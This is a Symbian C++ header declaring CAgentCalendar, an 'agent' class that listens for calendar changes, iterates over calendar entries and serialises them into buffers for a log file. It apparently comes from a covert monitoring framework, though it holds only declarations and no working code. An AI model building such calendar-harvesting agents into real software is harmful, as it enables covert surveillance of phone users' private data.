/*
 ============================================================================
 Name		: AgentCalendar.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentCalendar declaration
 ============================================================================
 */

#ifndef AGENTCALENDAR_H
#define AGENTCALENDAR_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>


#include <calprogresscallback.h>
#include <caliterator.h>
#include <caltime.h>
#include <calcommon.h>
#include <calsession.h>
#include <calentryview.h>

#include <HT\Logging.h>
#include <HT\LongRunTask.h>

#include "AbstractAgent.h"
// CLASS DECLARATION

/**
 *  CAgentCalendar
 * 
 */
class CAgentCalendar : public CAbstractAgent, public MLongTaskCallBack, public MCalProgressCallBack, public MCalChangeCallBack2
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentCalendar();

	/**
	 * Two-phased constructor.
	 */
	static CAgentCalendar* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentCalendar* NewLC(const TDesC8& params);
	
	/**
	 * From MCallChangeCallBack2
	 */
	void CalChangeNotification(RArray< TCalChangeEntry > &aChangeItems);

protected:
	// From CAbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();

private: // from MCalProgressCallBack
	/** This calls the observing class with the percentage complete of the current operation.	
	@param aPercentageCompleted The percentage complete. */
	virtual void Progress(TInt aPercentageCompleted);
	
	/**	This calls the observing class when the current operation is finished.	
	@param aError The error if the operation failed, or KErrNone if successful. */
	virtual void Completed(TInt aError);
	
	/** Asks the observing class whether progress callbacks are required.	
	@return If the observing class returns EFalse, then the Progress() function will not be called. */
	virtual TBool NotifyProgress();

private: // from MLongTaskCallBack
	virtual void DoOneRoundL();
	
	/**
	 * Transform the information contained in the item in a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8* CAgentCalendar::GetTTimeBufferL(const TTime aTime);


private:
	
	//TInt64 GetFiletime(const TTime aCurrentUtcTime);
	
	/**
	 * Transform the information contained in the CalEntry in a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8* GetCalEntryBufferL(const CCalEntry& calEntry);

	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentCalendar();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CLongTaskAO* iLongTask;
	TBool iStopLongTask;
	CCalSession* iCalSession;
	CCalEntryView* iCalView;
	
	TCalTime iTimestamp;
	RArray< TCalLocalUid > iCalUidArray;
	TInt iCalIndex;
	
	CLogFile* iMarkupFile;

		
	__FLOG_DECLARATION_MEMBER
	};

#endif // AGENTCalendar_H
